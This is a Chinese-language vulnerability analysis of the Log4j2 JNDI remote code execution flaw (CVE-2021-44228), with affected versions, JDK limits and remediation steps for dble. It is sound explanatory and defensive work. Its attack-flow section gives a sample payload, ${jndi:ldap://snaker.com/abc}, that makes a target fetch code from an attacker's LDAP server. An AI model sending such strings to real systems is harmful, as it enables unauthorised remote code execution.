**\# 漏洞描述**

  

该漏洞的介绍我就不多废话了，估计整个安全圈都知道，该漏洞编号为CVE-2021-44228，攻击者仅需要向目标服务器发送特定JNDI链接就可以触发漏洞并在目标机器上执行任意代码，影响面和破坏力极大。

 

 

**\# 影响范围**

  

**2.0 <= Apache log4j2 <= 2.14.1**

（备注：理论上Log4j 1.x仍然可能受到JNDI影响，但是需要通过配置显式开启JMSAppender，此选项默认是关闭的，所以局限性比较大）

**\# 漏洞分析**

  

此漏洞的罪魁祸首来自 Log4j Lookup 机制，正是因为这个机制，导致Java应用处理日志时出现严重的问题。从官方的解释来看，它的确是一个正常的功能。但是很显然，开发人员没有考虑JNDI可能带来的危害，导致这潜在的威胁终于爆发。 来看看这 Lookup 机制，官方解释道，Lookup机制提供了一种在任意位置向 Log4j 配置添加值的方法，是实现 StrLookup 接口的特殊类型的插件。 在 org.apache.logging.log4j.core.pattern.format 方法中，会对传入进来的内容进行判断，看代码分析。路径：

后面就是重复的轮询，直至解析。所以在开头，我就说罪魁祸首来自Log4j Lookup机制。此外，从官方对于logger解释中看，logger还有很多方法，logger的level属性中共有8个级别，按照从低到高为：All < Trace < Debug < Info < Warn < Error < Fatal < OFF  

![](../Images/25e667de63b052e7070d1911f5420b46.png)

可以看到每一级别的数值，经过分析发现，只有当前日志优先级数值小于或等于Log4j2的200的时候，程序才会继续执行。所以能够触发漏洞的只有 error 和 fatal 。当然这只是默认情况下是这样，level 本身是可以调整的。总的来说，在日常漏洞挖掘中，可以尝试找一些容易存在记录错误的功能点，从而引发 error() 即可触发漏洞。比如 Solr 的 Add Core 触发 Log4j2 JNDI 漏洞。

 

**需要注意的是，并不是所有使用了Log4j2的项目都会受到漏洞影响。因为该漏洞的利用涉及RMI 和 LDAP 协议，然而 RMI 和 LDAP 协议受 JDK 版本影响。**

 

**JDK 6u45、7u21版本之后：**java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。

**JDK 6u141、7u131、8u121之后：**增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。

**JDK 6u211、7u201、8u191之后：**增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。

  

**这里简单总结Log4j2远程代码执行漏洞的过程：**

1\. 攻击者发出带有恶意的数据请求包，如：${jndi:ldap://snaker.com/abc}

2\. Java应用在记录日志时，Log4j发现需要通过JNDI发起请求，于是根据数据请求包里的恶意地址snaker.com发起请求。

3\. 由于Log4j Lookup机制，因恶意数据中含有 ${ 符号，因此会触发替换机制。

4\. 此时Log4j会将日志中的内容替换成真实内容并解析执行。

5\. 所以目标服务器会向攻击者搭建的恶意LDAP服务器发起请求。

6\. Java应用收到请求响应中植入的恶意可执行命令，导致在服务端中被执行。

  

还有关于 rc1 存在绕过的说法，实际上是对 lookup 的绕过，而 rc1 及以上版本，已默认将noLookups 设置为 Ture，也就是说默认不开启 lookups 功能，除非开发人员的应用场景不得已用到这功能，然后将其再次开启，否则很难成立。

**\# 漏洞修复**

  

(1) 升级log4j2组件（建议升级至2.17.0）；（备注：2.16.0版本已经修复了JNDI RCE漏洞，但是2.16.0版本存在DOS漏洞，会影响业务运行，所以建议升级至2.17.0）  
(2) 添加配置，在 dble 配置文件 /path/to/dble/conf 下添加配置文件 log4j2.component.properties并添加如下配置内容：log4j2.formatMsgNoLookups=True（备注：此方法需要重启dble，如果不重启，配置文件不会被加载）  
(3) 修改JVM参数，在 dble 配置文件/path/to/dble/conf/wrapper.cof 中添加如下配置：wrapper.java.additional.14=-Dlog4j2.formatMsgNoLookups=true（备注1：此方法需要重启dble，如果不重启，配置文件不会被加载）（备注2：执行以下命令判断是否使用该参数启动：ps aux|grep dble|grep 'formatMsgNoLookups'）
